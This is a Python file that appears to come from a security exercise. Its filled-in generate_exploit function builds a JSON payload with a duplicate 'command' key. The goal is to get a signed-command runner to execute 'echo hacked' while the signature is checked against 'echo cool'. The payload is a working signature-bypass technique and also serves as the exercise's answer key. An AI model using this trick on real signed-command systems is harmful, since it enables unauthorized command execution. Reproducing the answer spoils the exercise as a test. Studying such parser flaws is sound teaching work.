import json


def generate_example():
    # WARNING: DON'T EDIT THIS FUNCTION!
    return json.dumps({'command': 'echo cool', 'signature': '007152ab1a65e9e864928d0f5cc6f47e8ce6217c09f7e7518d3d15f901e33df7e4bd760e2538929bdf2c5bf710b2babbcb2f268f458551ecbee78df22f3bb039696a2fccf58ccdeeb0c235e36593aa4b8be3d62e4ae6a59f6aebf78e3aec5b1685672bff191969731a096fa8f9ef29926bbee303d0673482410a25d00c46bdc1'})


def generate_exploit() -> str:
    """This function returns the payload that will print `hacked`.

    Our payload should cause `run.py` to print out `hacked`.

    Warnings:
    1. `run.py` should print `hacked`, and the testing will be case *sensitive*
    2. This time, `run.py` must NOT crash

    Returns:
         The string of the payload.
    """
    r = """{"command": "echo hacked", "command": "echo cool", "signature": "007152ab1a65e9e864928d0f5cc6f47e8ce6217c09f7e7518d3d15f901e33df7e4bd760e2538929bdf2c5bf710b2babbcb2f268f458551ecbee78df22f3bb039696a2fccf58ccdeeb0c235e36593aa4b8be3d62e4ae6a59f6aebf78e3aec5b1685672bff191969731a096fa8f9ef29926bbee303d0673482410a25d00c46bdc1" }"""
    return r


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    if not 2 <= len(argv) <= 3:
        print('USAGE: %s [--example] <script-path>' % argv[0])
        return 1
    if len(argv) == 2:
        example, path = False, argv[1]
    else:
        example, path = True,  argv[2]
    if example:
        script = generate_example()
    else:
        script = generate_exploit()
    with open(path, 'w') as writer:
        writer.write(script)
    print('done')


if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
